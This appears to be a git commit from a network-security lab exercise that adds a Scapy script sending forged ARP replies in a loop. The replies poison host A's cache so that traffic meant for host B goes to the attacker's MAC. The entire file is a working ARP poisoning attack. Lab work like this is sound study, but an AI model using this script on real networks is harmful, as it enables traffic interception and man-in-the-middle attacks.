d843f8b685f6260517aaf866cc8b0e316f8e5baf
Paolo Fagioli <palfag@icloud.com>
2022-02-13 14:25:09 +0100

    update

---
+++ 02. ARP poisoning/Task 1.B/arp_reply.py
@@ -0,0 +1,36 @@
+from time import sleep
+
+from scapy.all import *
+from scapy.layers.inet import *
+from scapy.layers.l2 import ARP
+
+
+ether = Ether()
+arp = ARP()
+
+
+MAC_Attacker = '02:42:0a:09:00:69'
+MAC_A = '02:42:0a:09:00:05'
+IP_A = '10.9.0.5'
+IP_B = '10.9.0.6'
+
+ether.src = MAC_Attacker
+ether.dst = MAC_A
+
+
+arp.op = 2 # ARP REPLY
+
+
+arp.hwsrc = MAC_Attacker
+arp.hwdst = MAC_A
+arp.psrc = IP_B
+arp.pdst = IP_A
+arp.hlen = 6
+arp.plen = 4
+
+pkt = ether / arp
+
+
+while (True):
+    sendp(pkt)
+    sleep(1)
